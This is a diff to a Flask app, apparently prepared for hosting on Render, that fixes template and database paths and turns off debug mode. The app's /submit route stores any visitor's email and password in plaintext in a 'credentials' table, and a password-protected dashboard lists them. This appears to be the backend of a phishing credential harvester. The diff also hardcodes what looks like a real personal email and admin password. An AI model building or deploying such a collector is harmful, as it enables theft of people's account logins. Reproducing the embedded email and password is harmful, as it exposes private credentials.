@@ -2,16 +2,27 @@ from flask import Flask, render_template, request, redirect, session, url_for
 import sqlite3
 import os
 
-app = Flask(__name__)
+# -----------------------------
+# FIX: Absolute template path
+# -----------------------------
+BASE_DIR = os.path.abspath(os.path.dirname(__file__))
+
+app = Flask(
+    __name__,
+    template_folder=os.path.join(BASE_DIR, "templates")
+)
+
 app.secret_key = "replace_this_with_a_random_secret_key"
 
-# Admin login (your dashboard access)
+# Admin credentials
 ADMIN_EMAIL = "aibelshibin7@gmail.com"
 ADMIN_PASSWORD = "123456goodd"
 
-# Database setup
-DB_NAME = "database.db"
+DB_NAME = os.path.join(BASE_DIR, "database.db")
 
+# -----------------------------
+# Database init
+# -----------------------------
 def init_db():
     conn = sqlite3.connect(DB_NAME)
     c = conn.cursor()
@@ -25,9 +36,13 @@ def init_db():
     conn.commit()
     conn.close()
 
+# -----------------------------
+# Routes
+# -----------------------------
 @app.route("/")
 def home():
     return render_template("index.html")
+
 
 @app.route("/submit", methods=["POST"])
 def submit():
@@ -39,11 +54,15 @@ def submit():
 
     conn = sqlite3.connect(DB_NAME)
     c = conn.cursor()
-    c.execute("INSERT INTO credentials (email, password) VALUES (?, ?)", (email, password))
+    c.execute(
+        "INSERT INTO credentials (email, password) VALUES (?, ?)",
+        (email, password)
+    )
     conn.commit()
     conn.close()
 
     return "Saved successfully"
+
 
 @app.route("/admin-login", methods=["GET", "POST"])
 def admin_login():
@@ -54,9 +73,11 @@ def admin_login():
         if email == ADMIN_EMAIL and password == ADMIN_PASSWORD:
             session["logged_in"] = True
             return redirect(url_for("dashboard"))
+
         return "Wrong credentials"
 
     return render_template("login.html")
+
 
 @app.route("/dashboard")
 def dashboard():
@@ -71,12 +92,17 @@ def dashboard():
 
     return render_template("dashboard.html", items=data)
 
+
 @app.route("/logout")
 def logout():
     session.clear()
     return redirect(url_for("home"))
 
+
+# -----------------------------
+# Run app (Render safe)
+# -----------------------------
 if __name__ == "__main__":
     init_db()
     port = int(os.environ.get("PORT", 5000))
-    app.run(host="0.0.0.0", port=port, debug=True)
+    app.run(host="0.0.0.0", port=port)
